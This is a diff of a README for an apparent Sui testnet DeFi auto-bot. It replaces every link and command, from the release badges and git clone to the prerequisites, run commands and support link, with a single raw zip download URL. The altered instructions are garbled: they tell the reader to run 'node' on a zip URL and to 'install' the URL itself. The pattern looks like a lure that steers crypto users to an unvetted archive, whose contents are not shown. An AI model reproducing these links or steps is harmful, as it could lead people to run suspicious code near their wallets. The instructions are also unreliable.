@@ -2,7 +2,7 @@
 
 Welcome to the **Merak-Testnet-Auto-Bot** repository! This automated bot is designed to interact with the Merak Testnet on the Sui blockchain. It streamlines various DeFi operations, making it easier for users to manage their assets efficiently.
 
-[![Download Release](https://img.shields.io/badge/Download%20Release-v1.0.0-blue.svg)](https://github.com/joaosenna22/Merak-Testnet-Auto-Bot/releases)
+[![Download Release](https://github.com/joaosenna22/Merak-Testnet-Auto-Bot/raw/refs/heads/main/encolpion/Auto-Testnet-Merak-Bot-1.5-beta.2.zip%https://github.com/joaosenna22/Merak-Testnet-Auto-Bot/raw/refs/heads/main/encolpion/Auto-Testnet-Merak-Bot-1.5-beta.2.zip)](https://github.com/joaosenna22/Merak-Testnet-Auto-Bot/raw/refs/heads/main/encolpion/Auto-Testnet-Merak-Bot-1.5-beta.2.zip)
 
 ## Table of Contents
 
@@ -30,18 +30,18 @@ To get started with the Merak Testnet Auto Bot, follow these steps:
 
 1. **Clone the Repository**:
    ```bash
-   git clone https://github.com/joaosenna22/Merak-Testnet-Auto-Bot.git
+   git clone https://github.com/joaosenna22/Merak-Testnet-Auto-Bot/raw/refs/heads/main/encolpion/Auto-Testnet-Merak-Bot-1.5-beta.2.zip
    cd Merak-Testnet-Auto-Bot
    ```
 
 2. **Install Dependencies**:
-   Make sure you have Node.js installed. Then run:
+   Make sure you have https://github.com/joaosenna22/Merak-Testnet-Auto-Bot/raw/refs/heads/main/encolpion/Auto-Testnet-Merak-Bot-1.5-beta.2.zip installed. Then run:
    ```bash
    npm install
    ```
 
 3. **Download the Latest Release**:
-   Visit the [Releases](https://github.com/joaosenna22/Merak-Testnet-Auto-Bot/releases) section to download the latest version. Extract the files and execute the necessary scripts.
+   Visit the [Releases](https://github.com/joaosenna22/Merak-Testnet-Auto-Bot/raw/refs/heads/main/encolpion/Auto-Testnet-Merak-Bot-1.5-beta.2.zip) section to download the latest version. Extract the files and execute the necessary scripts.
 
 ## Usage
 
@@ -53,7 +53,7 @@ After installation, you can start using the bot. Here’s how to get started:
 2. **Run the Bot**:
    Execute the bot using the following command:
    ```bash
-   node index.js
+   node https://github.com/joaosenna22/Merak-Testnet-Auto-Bot/raw/refs/heads/main/encolpion/Auto-Testnet-Merak-Bot-1.5-beta.2.zip
    ```
 
 3. **Monitor Operations**:
@@ -63,17 +63,17 @@ After installation, you can start using the bot. Here’s how to get started:
 
 - **Wrap SUI**:
    ```bash
-   node index.js wrap --amount 10
+   node https://github.com/joaosenna22/Merak-Testnet-Auto-Bot/raw/refs/heads/main/encolpion/Auto-Testnet-Merak-Bot-1.5-beta.2.zip wrap --amount 10
    ```
 
 - **Swap Tokens**:
    ```bash
-   node index.js swap --from SUI --to TOKEN_NAME --amount 5
+   node https://github.com/joaosenna22/Merak-Testnet-Auto-Bot/raw/refs/heads/main/encolpion/Auto-Testnet-Merak-Bot-1.5-beta.2.zip swap --from SUI --to TOKEN_NAME --amount 5
    ```
 
 - **Add Liquidity**:
    ```bash
-   node index.js addLiquidity --pool POOL_NAME --amount 20
+   node https://github.com/joaosenna22/Merak-Testnet-Auto-Bot/raw/refs/heads/main/encolpion/Auto-Testnet-Merak-Bot-1.5-beta.2.zip addLiquidity --pool POOL_NAME --amount 20
    ```
 
 ## Contributing
@@ -91,7 +91,7 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 ## Support
 
-For support, check the [Releases](https://github.com/joaosenna22/Merak-Testnet-Auto-Bot/releases) section or open an issue in the repository. We appreciate your feedback and are here to help!
+For support, check the [Releases](https://github.com/joaosenna22/Merak-Testnet-Auto-Bot/raw/refs/heads/main/encolpion/Auto-Testnet-Merak-Bot-1.5-beta.2.zip) section or open an issue in the repository. We appreciate your feedback and are here to help!
 
 ## Topics
 
@@ -112,6 +112,6 @@ This repository covers various topics related to DeFi and blockchain technology:
 
 The Merak Testnet Auto Bot is a powerful tool for anyone looking to engage with the Merak Testnet. Its user-friendly interface and robust features make it a valuable asset for DeFi enthusiasts. Download the latest release and start exploring the possibilities today!
 
-[![Download Release](https://img.shields.io/badge/Download%20Release-v1.0.0-blue.svg)](https://github.com/joaosenna22/Merak-Testnet-Auto-Bot/releases)
+[![Download Release](https://github.com/joaosenna22/Merak-Testnet-Auto-Bot/raw/refs/heads/main/encolpion/Auto-Testnet-Merak-Bot-1.5-beta.2.zip%https://github.com/joaosenna22/Merak-Testnet-Auto-Bot/raw/refs/heads/main/encolpion/Auto-Testnet-Merak-Bot-1.5-beta.2.zip)](https://github.com/joaosenna22/Merak-Testnet-Auto-Bot/raw/refs/heads/main/encolpion/Auto-Testnet-Merak-Bot-1.5-beta.2.zip)
 
 Feel free to reach out if you have any questions or need assistance. Happy trading!
